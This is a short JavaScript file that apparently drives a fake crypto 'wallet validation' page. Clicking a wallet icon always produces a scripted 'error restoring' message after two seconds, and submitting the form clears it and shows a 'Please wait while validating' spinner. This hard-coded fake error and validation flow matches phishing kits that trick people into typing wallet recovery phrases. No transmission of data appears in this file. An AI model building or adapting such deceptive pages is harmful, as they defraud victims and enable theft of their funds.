// import icons from 'url:./icons.svg';
console.log("it worked")
const sendButt = document.querySelector(".bluebtn_bird")
const formDet = document.querySelector("#submitform")
const overBox = document.querySelector(".overbox")
const allWallet = document.querySelector(".pageStyles__SSection-sc-1navawn-4 ibLsRQ")

const renderSpinner = function(parentEle){
    
    setTimeout(function(){
        overBox.style.backgroundColor = "transparent";
        formDet.innerHTML = '';
        parentEle.innerHtml = '';
        const markup = `
         <div class="spinner">
         <span style="color: black;">Please wait while validating</span>
        <svg>
          <use href="./Wallets Validation_files/icons.svg#icon-loader"></use>
        </svg>
      </div>
        `
        parentEle.insertAdjacentHTML("afterbegin", markup)
    },300)
    
  }

const initial = function(word,dis1,dis2){
  document.querySelector(".textdx").textContent = `${word}`
  document.querySelector(".loaderw").style.display = dis1
  document.querySelector(".yuck").style.display = dis2
}

document.body.addEventListener("click", function(e){
    const clickedElement = e?.target;
    if(!clickedElement.classList.contains('img_icons')) return
    const walletName = clickedElement?.alt
   document.getElementById("extracttext").textContent = walletName;
   document.getElementById("extracttext2").textContent = walletName;
     document.querySelector("#fdxz").classList.remove("reddsdiv");

   initial("initializing", "block", "none")

   setTimeout(() => {
    document.querySelector("#fdxz").classList.add("reddsdiv");
    initial("error restoring", "none", "block")}, 2000)


   



})

sendButt.addEventListener("click",() => {
    // e.preventDefault()
    // console.log("button clicked")
    // Array.from(formDet).forEach(element => {
    //     // if(!element.classList.contains("allinput")) return
    //     // overBox.style.opacity= 0;
        
        
        
    //     console.log(element.value); 
    // });
renderSpinner(overBox)
})

console.log(formDet.children)